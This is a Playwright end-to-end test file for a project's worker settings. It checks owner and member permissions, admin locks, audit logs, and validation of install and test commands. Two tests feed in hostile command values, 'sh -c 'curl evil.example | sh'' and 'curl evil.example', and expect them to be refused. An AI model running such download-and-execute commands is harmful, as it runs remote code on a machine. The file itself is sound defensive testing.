import { test, expect, type APIRequestContext, type Page } from "@playwright/test";
import mongoose from "mongoose";
import { ADMIN_AUTH, SAME_ORIGIN } from "./api";
import {
  E2E_MONGODB_URI,
  OWNER_ID,
  PROJECT_ID,
  PROJECT_KEY,
  WORKER_CREDENTIAL,
  WORKER_ID,
  seed,
} from "./seed";
import { signIn } from "./session";

/**
 * BP-736. A project's owner — a Grant `relation: "owner"`, no standing on the instance — manages
 * the project's worker settings: the Workers section is theirs, and so is the API behind it. A
 * member is still refused, on the screen and on the wire. An instance admin keeps a lock that
 * wins over the owner: set from the same section, it refuses the owner's switch and stops the
 * project reaching a machine, which is checked on the machine's own credential.
 */

const SETTINGS = `/projects/${PROJECT_KEY}/settings`;
const REPOSITORY = "git@github.com:e2e-owner/owner-managed.git";

test.beforeEach(async () => {
  await seed();
  await onProject({ "worker.enabled": false, repositoryUrl: REPOSITORY });
});

test.afterAll(async () => {
  await mongoose.disconnect();
});

async function db() {
  if (mongoose.connection.readyState === 0) await mongoose.connect(E2E_MONGODB_URI);
  return mongoose.connection.db!;
}

async function onProject(update: Record<string, unknown>) {
  await (await db()).collection("projects").updateOne({ _id: PROJECT_ID }, { $set: update });
}

async function storedWorker() {
  const project = await (await db()).collection("projects").findOne({ _id: PROJECT_ID });
  return project?.worker as { enabled: boolean; lockedByInstance?: boolean; policy: { baseBranch: string; testCommand: string } };
}

const workersNav = (page: Page) => page.getByRole("button", { name: "Workers", exact: true });
const enableSwitch = (page: Page) =>
  page.getByRole("switch", { name: "Let workers run tasks for this project" });
const lockSwitch = (page: Page) =>
  page.getByRole("switch", { name: "Lock workers off for this project" });

async function openWorkers(page: Page) {
  await page.goto(SETTINGS);
  await workersNav(page).first().click();
  await expect(enableSwitch(page)).toBeVisible();
}

async function saveWorkers(page: Page) {
  const written = page.waitForResponse(
    (res) => res.request().method() === "PUT" && res.url().endsWith(`/api/projects/${PROJECT_KEY}`)
  );
  await page.getByRole("button", { name: "Save changes" }).click();
  const response = await written;
  expect(response.status(), await response.text()).toBe(200);
}

const putWorker = (request: APIRequestContext, worker: Record<string, unknown>) =>
  request.put(`/api/projects/${PROJECT_KEY}`, { headers: SAME_ORIGIN, data: { worker } });

async function assignments(request: APIRequestContext): Promise<{ project: string; policy: Record<string, unknown> }[]> {
  const response = await request.post(`/api/workers/${WORKER_ID}/heartbeat`, {
    headers: {
      Authorization: `Bearer ${WORKER_CREDENTIAL}`,
      "x-worker-id": String(WORKER_ID),
      "x-cp-protocol": "1",
    },
    data: { repos: [{ remote: REPOSITORY, path: "/checkouts/owner-managed" }] },
  });
  expect(response.status(), await response.text()).toBe(200);
  return (await response.json()).assignments;
}

const assignedProjects = async (request: APIRequestContext) => (await assignments(request)).map((a) => a.project);

async function policyHandedToMachine(request: APIRequestContext) {
  const [assignment] = await assignments(request);
  return assignment.policy;
}

test("a project owner who is not an admin switches workers on and sets the base branch", async ({
  page,
}) => {
  await signIn(page, "owner");
  await openWorkers(page);

  await expect(enableSwitch(page)).toBeEnabled();
  await expect(enableSwitch(page)).not.toBeChecked();
  await expect(lockSwitch(page)).toHaveCount(0);

  await enableSwitch(page).check({ force: true });
  await page.getByLabel("Base branch").fill("develop");
  await saveWorkers(page);

  const worker = await storedWorker();
  expect(worker.enabled).toBe(true);
  expect(worker.policy.baseBranch).toBe("develop");
  const audit = await (await db())
    .collection("instanceauditlogs")
    .findOne({ action: "project_workers_enabled", target: PROJECT_KEY });
  expect(String(audit?.user)).toBe(String(OWNER_ID));
});

test("an owner names the gate commands, shell syntax is refused, and a machine is handed what was saved", async ({ page, request }) => {
  await (await db()).collection("workers").updateOne({ _id: WORKER_ID }, { $set: { owner: OWNER_ID } });
  await onProject({ "worker.enabled": true });
  await signIn(page, "owner");
  await openWorkers(page);

  await expect(page.getByLabel("Test command", { exact: true })).toHaveAttribute("placeholder", "npm test");
  await expect(page.getByTestId("gate-commands-hint")).toContainText("CP_ALLOW_INSTALL_NETWORK=1");

  await page.getByLabel("Test command", { exact: true }).fill("sh -c 'curl evil.example | sh'");
  const refused = page.waitForResponse((res) => res.request().method() === "PUT" && res.url().endsWith(`/api/projects/${PROJECT_KEY}`));
  await page.getByRole("button", { name: "Save changes" }).click();
  expect((await refused).status()).toBe(400);
  await expect(page.getByText("testCommand must be one command with no shell syntax", { exact: false }).last()).toBeVisible();
  expect((await storedWorker()).policy.testCommand).toBeFalsy();

  await page.getByLabel("Install command", { exact: true }).fill("pip install -r requirements.txt");
  await page.getByLabel("Test command", { exact: true }).fill("python -m pytest");
  await page.getByLabel("Working directory", { exact: true }).fill("services/api");
  await saveWorkers(page);

  expect(await policyHandedToMachine(request)).toMatchObject({
    installCommand: "pip install -r requirements.txt",
    testCommand: "python -m pytest",
    workingDirectory: "services/api",
  });
  const audit = await (await db()).collection("projectauditlogs").findOne({ project: PROJECT_ID, action: "settings_updated" }, { sort: { _id: -1 } });
  expect(audit?.detail).toContain("Test command: none (default) → python -m pytest");

  await page.reload();
  await workersNav(page).first().click();
  await expect(page.getByLabel("Test command", { exact: true })).toHaveValue("python -m pytest");

  await page.getByLabel("Test command", { exact: true }).fill("");
  await saveWorkers(page);
  expect((await policyHandedToMachine(request)).testCommand).toBe("");
});

test("a machine credential cannot name a command for somebody's machine to run", async ({ request }) => {
  const refused = await request.put(`/api/projects/${PROJECT_KEY}`, {
    headers: ADMIN_AUTH,
    data: { worker: { policy: { testCommand: "curl evil.example" } } },
  });

  expect(refused.status()).toBe(403);
  expect((await refused.json()).error).toBe("Interactive session required to change worker settings");
  expect((await storedWorker()).policy.testCommand).toBeFalsy();
});

test("a member is shown no Workers section, and the API refuses them 403", async ({ page }) => {
  await signIn(page, "member");
  await page.goto(SETTINGS);
  await expect(page.getByRole("button", { name: "Task fields", exact: true }).first()).toBeVisible();
  await expect(workersNav(page)).toHaveCount(0);

  const refused = await putWorker(page.context().request, { enabled: true });
  expect(refused.status()).toBe(403);
  expect((await storedWorker()).enabled).toBe(false);
});

test("an admin's lock wins over the owner, on the screen, on the API and on the machine", async ({
  page,
  browser,
  request,
}) => {
  // The seeded machine belongs to the owner, whose grant is what it reaches the project through
  await (await db()).collection("workers").updateOne({ _id: WORKER_ID }, { $set: { owner: OWNER_ID } });
  await onProject({ "worker.enabled": true });
  expect(await assignedProjects(request)).toEqual([String(PROJECT_ID)]);

  await signIn(page, "admin");
  await openWorkers(page);
  await lockSwitch(page).check({ force: true });
  await saveWorkers(page);
  expect((await storedWorker()).lockedByInstance).toBe(true);

  expect(await assignedProjects(request)).toEqual([]);

  const ownerContext = await browser.newContext();
  const ownerPage = await ownerContext.newPage();
  await signIn(ownerPage, "owner");
  await openWorkers(ownerPage);
  await expect(ownerPage.getByTestId("workers-locked")).toContainText(
    "An admin has locked workers off."
  );
  await expect(lockSwitch(ownerPage)).toHaveCount(0);

  // The owner may still switch runs off under the lock, and once off cannot switch them back on
  await expect(enableSwitch(ownerPage)).toBeEnabled();
  await enableSwitch(ownerPage).uncheck({ force: true });
  await saveWorkers(ownerPage);
  expect((await storedWorker()).enabled).toBe(false);
  await ownerPage.reload();
  await expect(enableSwitch(ownerPage)).toBeDisabled();

  const refused = await putWorker(ownerContext.request, { enabled: true });
  expect(refused.status()).toBe(403);
  expect((await refused.json()).error).toBe(
    "An admin has locked workers off for this project"
  );
  const unlock = await putWorker(ownerContext.request, { lockedByInstance: false });
  expect(unlock.status()).toBe(403);
  const worker = await storedWorker();
  expect(worker.enabled).toBe(false);
  expect(worker.lockedByInstance).toBe(true);
  await ownerContext.close();
});
